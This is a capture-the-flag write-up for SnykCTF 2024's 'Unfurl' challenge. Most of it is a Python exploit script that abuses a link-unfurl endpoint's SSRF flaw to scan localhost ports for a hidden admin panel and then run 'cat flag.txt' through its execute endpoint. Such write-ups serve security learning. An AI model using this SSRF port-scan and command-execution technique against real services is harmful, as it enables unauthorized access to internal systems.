# Challenge Statement 
![image](https://github.com/user-attachments/assets/46b6f599-7dba-4f67-8e1d-d08c886f07fd)

Attachment: [Unfurl.zip](https://github.com/harishkannan05/SnykCTF-2024-Writeup/blob/main/Attachments/Unfurl.zip)

# Solution
Diving into the source code, we find that this involves `SSRF (Server-Side Request Forgery`. <br/>

These vulnerabilities can be confirmed by using Snyk.
![image](https://github.com/user-attachments/assets/22eaff97-7e68-4791-9166-380900d28fee)

The application consists of a hidden admin panel running on a random port (between 1024-4999), which we could use to get the flag. <br/>
Using the help of ChatGPT, I was able to write a script which find the admin port, calls the execute endpoint and cats the flag.

```
import requests
import time

# Define the URLs
PUBLIC_UNFURL_URL = "http://challenge.ctf.games:30729/unfurl"
ADMIN_BASE_URL = "http://127.0.0.1:{}"

# Scan for the admin panel port
def find_admin_port():
    print("[*] Scanning for Admin Panel...")
    for port in range(1024, 5000):
        try:
            test_url = f"http://127.0.0.1:{port}/"
            payload = {"url": test_url}
            response = requests.post(PUBLIC_UNFURL_URL, json=payload)

            if response.status_code == 200 and ("Admin Panel" in response.text or "Welcome" in response.text):
                print(f"[+] Found Admin Panel on port {port}")
                return port
        except requests.exceptions.RequestException:
            continue
    return None

# Test SSRF before exploitation
def test_ssrf(admin_port):
    test_url = f"http://127.0.0.1:{admin_port}/system-info"
    payload = {"url": test_url}

    print(f"[*] Testing SSRF with URL: {test_url}")
    response = requests.post(PUBLIC_UNFURL_URL, json=payload)

    if response.status_code == 200 and "System Information" in response.text:
        print("[+] SSRF is working!")
        return True
    else:
        print("[-] SSRF test failed.")
        return False

# Use SSRF to execute a command
def exploit_ssrf(admin_port):
    payload_url = f"http://127.0.0.1:{admin_port}/execute?cmd=cat%20flag.txt"
    payload = {"url": payload_url}

    print(f"[*] Sending SSRF payload: {payload_url}")
    response = requests.post(PUBLIC_UNFURL_URL, json=payload)

    if response.status_code == 200:
        print("[+] Successfully exploited SSRF!")
        print("[+] Flag Output:\n")
        print(response.text)
    else:
        print("[-] SSRF attack failed.")

if __name__ == "__main__":
    admin_port = find_admin_port()
    if admin_port:
        if test_ssrf(admin_port):
            exploit_ssrf(admin_port)
        else:
            print("[-] SSRF seems blocked.")
    else:
        print("[-] Could not find the Admin Panel port.")
```

